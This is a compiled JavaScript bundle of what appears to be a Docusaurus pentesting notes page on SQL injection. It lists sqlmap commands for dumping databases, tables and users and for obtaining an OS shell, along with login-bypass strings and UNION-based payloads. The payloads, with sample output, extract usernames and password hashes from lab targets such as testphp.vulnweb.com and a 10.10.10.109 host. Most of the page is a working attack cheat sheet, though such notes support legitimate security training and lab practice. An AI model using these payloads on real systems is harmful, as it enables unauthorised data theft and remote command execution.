(window.webpackJsonp=window.webpackJsonp||[]).push([[30],{128:function(e,a,t){"use strict";t.r(a),t.d(a,"frontMatter",(function(){return l})),t.d(a,"metadata",(function(){return s})),t.d(a,"rightToc",(function(){return b})),t.d(a,"default",(function(){return o}));var r=t(2),n=t(6),c=(t(0),t(142)),l={title:"SQL Injection",sidebar_label:"SQL Injection"},s={id:"hunting/web/sql_injection",title:"SQL Injection",description:"* sqlmap",source:"@site/docs\\hunting\\web\\sql_injection.md",permalink:"/rosh/docs/hunting/web/sql_injection",sidebar_label:"SQL Injection",sidebar:"huntingSidebar",previous:{title:"tshark",permalink:"/rosh/docs/hunting/utilities/tshark"},next:{title:"Web Recon",permalink:"/rosh/docs/hunting/web/web_recon"}},b=[{value:"GET request",id:"get-request",children:[]},{value:"POST request",id:"post-request",children:[]},{value:"databases",id:"databases",children:[]},{value:"tables",id:"tables",children:[]},{value:"data",id:"data",children:[]},{value:"columns",id:"columns",children:[{value:"os shell",id:"os-shell",children:[]}]},{value:"INFORMATION_SCHEMA Tables",id:"information_schema-tables",children:[]},{value:"check vulnerability",id:"check-vulnerability",children:[]},{value:"enumerate fields of search query",id:"enumerate-fields-of-search-query",children:[]},{value:"enumerate databases",id:"enumerate-databases",children:[{value:"current database",id:"current-database",children:[]},{value:"using INFORMATION_SCHEMA",id:"using-information_schema",children:[]},{value:"all databases",id:"all-databases",children:[]}]},{value:"enumerate tables",id:"enumerate-tables",children:[]},{value:"enumerate columns",id:"enumerate-columns",children:[]},{value:"show data",id:"show-data",children:[]}],i={rightToc:b};function o(e){var a=e.components,t=Object(n.a)(e,["components"]);return Object(c.a)("wrapper",Object(r.a)({},i,t,{components:a,mdxType:"MDXLayout"}),Object(c.a)("ul",null,Object(c.a)("li",{parentName:"ul"},Object(c.a)("a",Object(r.a)({parentName:"li"},{href:"#sqlmap"}),Object(c.a)("inlineCode",{parentName:"a"},"sqlmap")),Object(c.a)("ul",{parentName:"li"},Object(c.a)("li",{parentName:"ul"},Object(c.a)("a",Object(r.a)({parentName:"li"},{href:"#get-request"}),"GET request")),Object(c.a)("li",{parentName:"ul"},Object(c.a)("a",Object(r.a)({parentName:"li"},{href:"#post-request"}),"POST request")),Object(c.a)("li",{parentName:"ul"},Object(c.a)("a",Object(r.a)({parentName:"li"},{href:"#databases"}),"databases")),Object(c.a)("li",{parentName:"ul"},Object(c.a)("a",Object(r.a)({parentName:"li"},{href:"#tables"}),"tables")),Object(c.a)("li",{parentName:"ul"},Object(c.a)("a",Object(r.a)({parentName:"li"},{href:"#data"}),"data")),Object(c.a)("li",{parentName:"ul"},Object(c.a)("a",Object(r.a)({parentName:"li"},{href:"#columns"}),"columns")),Object(c.a)("li",{parentName:"ul"},Object(c.a)("a",Object(r.a)({parentName:"li"},{href:"#os-shell"}),"os shell")))),Object(c.a)("li",{parentName:"ul"},Object(c.a)("a",Object(r.a)({parentName:"li"},{href:"#information_schema"}),"INFORMATION_SCHEMA"),Object(c.a)("ul",{parentName:"li"},Object(c.a)("li",{parentName:"ul"},Object(c.a)("a",Object(r.a)({parentName:"li"},{href:"#information_schema-tables"}),"INFORMATION_SCHEMA Tables")))),Object(c.a)("li",{parentName:"ul"},Object(c.a)("a",Object(r.a)({parentName:"li"},{href:"#manual-methods"}),"Manual Methods"),Object(c.a)("ul",{parentName:"li"},Object(c.a)("li",{parentName:"ul"},Object(c.a)("a",Object(r.a)({parentName:"li"},{href:"#check-vulnerability"}),"check vulnerability")),Object(c.a)("li",{parentName:"ul"},Object(c.a)("a",Object(r.a)({parentName:"li"},{href:"#enumerate-fields-of-search-query"}),"enumerate fields of search query")),Object(c.a)("li",{parentName:"ul"},Object(c.a)("a",Object(r.a)({parentName:"li"},{href:"#enumerate-databases"}),"enumerate databases")),Object(c.a)("li",{parentName:"ul"},Object(c.a)("a",Object(r.a)({parentName:"li"},{href:"#enumerate-tables"}),"enumerate tables")),Object(c.a)("li",{parentName:"ul"},Object(c.a)("a",Object(r.a)({parentName:"li"},{href:"#enumerate-columns"}),"enumerate columns")),Object(c.a)("li",{parentName:"ul"},Object(c.a)("a",Object(r.a)({parentName:"li"},{href:"#show-data"}),"show data"))))),Object(c.a)("h1",{id:"sqlmap"},Object(c.a)("inlineCode",{parentName:"h1"},"sqlmap")),Object(c.a)("p",null,"If we know the DBMS, we can use option ",Object(c.a)("inlineCode",{parentName:"p"},"--dbms=mysql")),Object(c.a)("h2",{id:"get-request"},"GET request"),Object(c.a)("pre",null,Object(c.a)("code",Object(r.a)({parentName:"pre"},{}),'sqlmap -u "http://example.com/?a=1&b=2&c=3" -p "a,b"\n')),Object(c.a)("h2",{id:"post-request"},"POST request"),Object(c.a)("pre",null,Object(c.a)("code",Object(r.a)({parentName:"pre"},{}),'sqlmap -u "http://example.com/" --data "a=1&b=2&c=3" -p "a,b" --method POST\n')),Object(c.a)("p",null,"Alternatively, copy the POST request in the intercept of burpsuite in a file and use it as follows"),Object(c.a)("pre",null,Object(c.a)("code",Object(r.a)({parentName:"pre"},{}),"$ cat web.txt\nPOST /results.php HTTP/1.1\nHost: 10.10.10.109\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nReferer: http://10.10.10.109/search.php\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 13\nConnection: close\nUpgrade-Insecure-Requests: 1\n\nsearch=killer\n")),Object(c.a)("pre",null,Object(c.a)("code",Object(r.a)({parentName:"pre"},{}),'sqlmap -r web.txt -p "search"\n')),Object(c.a)("h2",{id:"databases"},"databases"),Object(c.a)("pre",null,Object(c.a)("code",Object(r.a)({parentName:"pre"},{}),'sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" --dbs \n')),Object(c.a)("h2",{id:"tables"},"tables"),Object(c.a)("pre",null,Object(c.a)("code",Object(r.a)({parentName:"pre"},{}),'sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" --tables -D testdb\n')),Object(c.a)("h2",{id:"data"},"data"),Object(c.a)("pre",null,Object(c.a)("code",Object(r.a)({parentName:"pre"},{}),'sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" --dump -D testdb -T users\n')),Object(c.a)("h2",{id:"columns"},"columns"),Object(c.a)("pre",null,Object(c.a)("code",Object(r.a)({parentName:"pre"},{}),'sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" -D testdb -T users --columns\n')),Object(c.a)("h3",{id:"os-shell"},"os shell"),Object(c.a)("pre",null,Object(c.a)("code",Object(r.a)({parentName:"pre"},{}),'sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" --os-shell\n')),Object(c.a)("h1",{id:"information_schema"},"INFORMATION_SCHEMA"),Object(c.a)("p",null,"Refs:"),Object(c.a)("ul",null,Object(c.a)("li",{parentName:"ul"},Object(c.a)("a",Object(r.a)({parentName:"li"},{href:"https://www.cmi.ac.in/~madhavan/courses/databases10/mysql-5.0-reference-manual/information-schema.html#schemata-table"}),"https://www.cmi.ac.in/~madhavan/courses/databases10/mysql-5.0-reference-manual/information-schema.html#schemata-table"))),Object(c.a)("p",null,"INFORMATION_SCHEMA provides access to database metadata."),Object(c.a)("p",null,"Metadata is data about the data, such as the name of a database or table, the data type of a column, or access privileges. INFORMATION_SCHEMA is the information database, the place that stores information about all the other databases that the MySQL server maintains. Inside INFORMATION_SCHEMA there are several read-only tables. They are actually views, not base tables, so there are no files associated with them."),Object(c.a)("h2",{id:"information_schema-tables"},"INFORMATION_SCHEMA Tables"),Object(c.a)("ul",null,Object(c.a)("li",{parentName:"ul"},Object(c.a)("a",Object(r.a)({parentName:"li"},{href:"https://dev.mysql.com/doc/refman/8.0/en/columns-table.html"}),"https://dev.mysql.com/doc/refman/8.0/en/columns-table.html")),Object(c.a)("li",{parentName:"ul"},Object(c.a)("a",Object(r.a)({parentName:"li"},{href:"https://dev.mysql.com/doc/refman/8.0/en/schemata-table.html"}),"https://dev.mysql.com/doc/refman/8.0/en/schemata-table.html")),Object(c.a)("li",{parentName:"ul"},Object(c.a)("a",Object(r.a)({parentName:"li"},{href:"https://dev.mysql.com/doc/refman/8.0/en/st-units-of-measure-table.html"}),"https://dev.mysql.com/doc/refman/8.0/en/st-units-of-measure-table.html"))),Object(c.a)("h1",{id:"manual-methods"},"Manual Methods"),Object(c.a)("h2",{id:"check-vulnerability"},"check vulnerability"),Object(c.a)("pre",null,Object(c.a)("code",Object(r.a)({parentName:"pre"},{}),"' or 1='1\n' or 1=1;--\n' or 1=1;#\n') or ('x'='x\n' or like '%';--\n' or 1=1 LIMIT 1;--\n\nUSERNAME: ' or 1/*\nPASSWORD: */ =1 --\n\nUSERNAME: admin' or 'a'='a\nPASSWORD '#\n")),Object(c.a)("h2",{id:"enumerate-fields-of-search-query"},"enumerate fields of search query"),Object(c.a)("p",null,"In burpsuite, go to repeater mode and keep on increasing the numbers till the fields of search query gets printed on the webpage"),Object(c.a)("pre",null,Object(c.a)("code",Object(r.a)({parentName:"pre"},{}),"search=killer' UNION SELECT 1,2,3,4,5,6-- -\n")),Object(c.a)("pre",null,Object(c.a)("code",Object(r.a)({parentName:"pre"},{}),"<h3>Search results </h3>\nID: 1<br/>Name: 2 3<br/>Position: 4<br />Phone No: 5<br />Email: 6<br/>\n")),Object(c.a)("h2",{id:"enumerate-databases"},"enumerate databases"),Object(c.a)("h3",{id:"current-database"},"current database"),Object(c.a)("pre",null,Object(c.a)("code",Object(r.a)({parentName:"pre"},{}),"search=killer' UNION SELECT database(),2,3,4,5,6-- -\n")),Object(c.a)("pre",null,Object(c.a)("code",Object(r.a)({parentName:"pre"},{}),"<h3>Search results </h3> \nID: Staff<br/>Name: 2 3<br/>Position: 4<br />Phone No: 5<br />Email: 6<br/>\n")),Object(c.a)("h3",{id:"using-information_schema"},"using INFORMATION_SCHEMA"),Object(c.a)("pre",null,Object(c.a)("code",Object(r.a)({parentName:"pre"},{}),"search=killer' UNION SELECT SCHEMA_NAME,2,3,4,5,6 FROM INFORMATION_SCHEMA.SCHEMATA-- -\n")),Object(c.a)("pre",null,Object(c.a)("code",Object(r.a)({parentName:"pre"},{}),"<h3>Search results </h3> \nID: information_schema<br/>Name: 2 3<br/>Position: 4<br />Phone No: 5<br />Email: 6<br/><br/>ID: Staff<br/>Name: 2 3\n<br/>Position: 4<br />Phone No: 5<br />Email: 6<br/><br/>ID: users<br/>Name: 2 3<br/>Position: 4<br />Phone No: 5<br />Email:\n6<br/>\n")),Object(c.a)("h3",{id:"all-databases"},"all databases"),Object(c.a)("pre",null,Object(c.a)("code",Object(r.a)({parentName:"pre"},{}),"search=killer' UNION SELECT GROUP_CONCAT(SCHEMA_NAME),2,3,4,5,6 FROM INFORMATION_SCHEMA.SCHEMATA-- -\n")),Object(c.a)("pre",null,Object(c.a)("code",Object(r.a)({parentName:"pre"},{}),"<h3>Search results </h3>\nID: information_schema,Staff,users<br/>Name: 2 3<br/>Position: 4<br />Phone No: 5<br />Email: 6<br/>\n")),Object(c.a)("h2",{id:"enumerate-tables"},"enumerate tables"),Object(c.a)("pre",null,Object(c.a)("code",Object(r.a)({parentName:"pre"},{}),'search=killer\' UNION SELECT GROUP_CONCAT(TABLE_NAME),2,3,4,5,6 FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA="Staff"-- -\n')),Object(c.a)("pre",null,Object(c.a)("code",Object(r.a)({parentName:"pre"},{}),"<h3>Search results </h3> \nID: StaffDetails,Users<br/>Name: 2 3<br/>Position: 4<br />Phone No: 5<br />Email: 6<br/>\n")),Object(c.a)("h2",{id:"enumerate-columns"},"enumerate columns"),Object(c.a)("pre",null,Object(c.a)("code",Object(r.a)({parentName:"pre"},{}),'search=killer\' UNION SELECT GROUP_CONCAT(COLUMN_NAME),2,3,4,5,6 FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA="Staff" AND TABLE_NAME="Users"-- -\n')),Object(c.a)("pre",null,Object(c.a)("code",Object(r.a)({parentName:"pre"},{}),"<h3>Search results </h3>\nID: UserID,Username,Password<br/>Name: 2 3<br/>Position: 4<br />Phone No: 5<br />Email: 6<br/>\n")),Object(c.a)("h2",{id:"show-data"},"show data"),Object(c.a)("pre",null,Object(c.a)("code",Object(r.a)({parentName:"pre"},{}),'search=killer\' UNION SELECT GROUP_CONCAT(Username,":",Password),2,3,4,5,6 FROM Staff.Users-- -\n')),Object(c.a)("pre",null,Object(c.a)("code",Object(r.a)({parentName:"pre"},{}),"<h3>Search results </h3>\nID: admin:856f5de590ef37314e7c3bdf6f8a66dc<br/>Name: 2 3<br/>Position: 4<br />Phone No: 5<br />Email: 6<br/>\n")))}o.isMDXComponent=!0},142:function(e,a,t){"use strict";t.d(a,"a",(function(){return m}));var r=t(0),n=t.n(r);function c(e,a,t){return a in e?Object.defineProperty(e,a,{value:t,enumerable:!0,configurable:!0,writable:!0}):e[a]=t,e}function l(e,a){var t=Object.keys(e);if(Object.getOwnPropertySymbols){var r=Object.getOwnPropertySymbols(e);a&&(r=r.filter((function(a){return Object.getOwnPropertyDescriptor(e,a).enumerable}))),t.push.apply(t,r)}return t}function s(e){for(var a=1;a<arguments.length;a++){var t=null!=arguments[a]?arguments[a]:{};a%2?l(Object(t),!0).forEach((function(a){c(e,a,t[a])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(t)):l(Object(t)).forEach((function(a){Object.defineProperty(e,a,Object.getOwnPropertyDescriptor(t,a))}))}return e}function b(e,a){if(null==e)return{};var t,r,n=function(e,a){if(null==e)return{};var t,r,n={},c=Object.keys(e);for(r=0;r<c.length;r++)t=c[r],a.indexOf(t)>=0||(n[t]=e[t]);return n}(e,a);if(Object.getOwnPropertySymbols){var c=Object.getOwnPropertySymbols(e);for(r=0;r<c.length;r++)t=c[r],a.indexOf(t)>=0||Object.prototype.propertyIsEnumerable.call(e,t)&&(n[t]=e[t])}return n}var i=n.a.createContext({}),o=function(e){var a=n.a.useContext(i),t=a;return e&&(t="function"==typeof e?e(a):s(s({},a),e)),t},p={inlineCode:"code",wrapper:function(e){var a=e.children;return n.a.createElement(n.a.Fragment,{},a)}},u=n.a.forwardRef((function(e,a){var t=e.components,r=e.mdxType,c=e.originalType,l=e.parentName,i=b(e,["components","mdxType","originalType","parentName"]),u=o(t),m=r,O=u["".concat(l,".").concat(m)]||u[m]||p[m]||c;return t?n.a.createElement(O,s(s({ref:a},i),{},{components:t})):n.a.createElement(O,s({ref:a},i))}));function m(e,a){var t=arguments,r=a&&a.mdxType;if("string"==typeof e||r){var c=t.length,l=new Array(c);l[0]=u;var s={};for(var b in a)hasOwnProperty.call(a,b)&&(s[b]=a[b]);s.originalType=e,s.mdxType="string"==typeof e?e:r,l[1]=s;for(var i=2;i<c;i++)l[i]=t[i];return n.a.createElement.apply(null,l)}return n.a.createElement.apply(null,t)}u.displayName="MDXCreateElement"}}]);